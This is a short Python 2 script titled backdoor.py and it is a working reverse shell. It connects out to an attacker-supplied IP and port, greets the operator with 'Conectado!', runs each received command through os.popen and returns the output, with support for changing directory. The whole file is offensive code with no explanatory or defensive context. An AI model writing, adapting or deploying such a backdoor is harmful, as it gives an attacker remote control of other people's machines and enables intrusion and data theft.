import os,socket,sys
def usage():
    print '''
    ------------------------------
    |backdoor.py 192.168.1.3 2121|
    ------------------------------''',exit()
if len(sys.argv) < 3:usage()
s=socket.socket()
s.connect((sys.argv[1],int(sys.argv[2])))
s.send('''
             ###########################
                    Conectado!\n>>>''')
while 1:
    data = s.recv(512)
    if "q" == data.lower():
        s.close()
        break;
    else:
        if data.startswith('cd'):
            os.chdir(data[3:].replace('\n',''))
            s.send("Moved to "+str(os.getcwd()))
            result='\n'
        else:
            result=os.popen(data).read()
    if (data.lower() != "q"):
            s.send(str(result)+">>")
    else:
        s.send(str(result))
        s.close()
        break;
exit()
